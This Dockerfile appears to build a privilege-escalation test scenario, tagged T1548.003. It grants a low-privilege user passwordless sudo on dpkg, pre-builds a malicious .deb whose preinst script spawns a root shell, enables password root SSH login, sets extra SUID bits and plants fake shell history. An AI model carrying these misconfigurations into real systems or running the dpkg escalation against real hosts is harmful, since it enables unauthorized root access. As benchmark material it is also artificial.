FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_dpkg
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/dpkg as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and dpkg (already installed but ensure sudo is present)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        dpkg \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify dpkg is installed
RUN which dpkg && ls -la /usr/bin/dpkg

# Create low-privilege user
RUN useradd -m -s /bin/bash testuser && \
    echo "testuser:t3stP@ss" | chpasswd

# --- Configure sudo vulnerability ---
# dpkg can be abused to get a root shell. The exploit approach:
#   1. Create a malicious .deb package with a pre-install script that spawns a shell
#   2. sudo dpkg -i malicious.deb  (pre/post-inst scripts run as root)
#   Alternatively: sudo dpkg -l, then !/bin/sh from the pager
#   Or simply: sudo dpkg --configure -a with crafted maintainer scripts
RUN echo "testuser ALL=(root) NOPASSWD: /usr/bin/dpkg" > /etc/sudoers.d/dpkg && \
    chmod 440 /etc/sudoers.d/dpkg

# Pre-build a malicious .deb in the user's home directory for easy exploitation
RUN mkdir -p /home/testuser/exploit/DEBIAN && \
    echo "Package: exploit\nVersion: 1.0\nArchitecture: all\nMaintainer: attacker\nDescription: privesc" \
    > /home/testuser/exploit/DEBIAN/control && \
    printf '#!/bin/bash\n/bin/bash\n' > /home/testuser/exploit/DEBIAN/preinst && \
    chmod 755 /home/testuser/exploit/DEBIAN/preinst && \
    dpkg-deb --build /home/testuser/exploit /home/testuser/x_1.0_all.deb && \
    chown -R testuser:testuser /home/testuser/exploit /home/testuser/x_1.0_all.deb

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:r00tCh@ng3d" | chpasswd

# --- Variant environment noise (D4-D10) ---
RUN echo "dev-srv-42" > /etc/hostname

RUN useradd -m -s /bin/sh svcadmin && echo "svcadmin:Wk$8dLm2" | chpasswd && \
    useradd -m -s /bin/bash webdev && echo "webdev:devPass!9" | chpasswd

RUN echo "*/15 * * * * root /usr/bin/find /tmp -name '*.tmp' -mtime +7 -delete 2>/dev/null" >> /etc/crontab && \
    echo "0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf 2>/dev/null" >> /etc/crontab

RUN echo -e "╔══════════════════════════════════════════════╗\n  ║  Development Server #42 — INTERNAL USE ONLY  ║\n  ║  Unauthorized access is prohibited.          ║\n  ║  All sessions are monitored and logged.      ║\n  ╚══════════════════════════════════════════════╝" > /etc/motd

RUN apt-get update -qq && apt-get install -y -qq net-tools curl file lsof > /dev/null 2>&1 && rm -rf /var/lib/apt/lists/* || true

RUN [ -f /usr/bin/wall ] && chmod u+s /usr/bin/wall || true && \
    [ -f /usr/bin/expiry ] && chmod u+s /usr/bin/expiry || true && \
    [ -f /usr/bin/write.ul ] && chmod u+s /usr/bin/write.ul || true
RUN echo -e "find / -name \"*.conf\" 2>/dev/null\ncat /etc/nginx/nginx.conf\nsystemctl status apache2\nmysql -u root -p\ndocker ps\nkubectl get pods\nnmap -sV localhost\npython3 -m http.server 8080\nssh admin@10.0.0.1\nwget https://example.com/update.tar.gz" > /home/testuser/.bash_history && chown testuser:testuser /home/testuser/.bash_history
# --- End variant noise ---

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]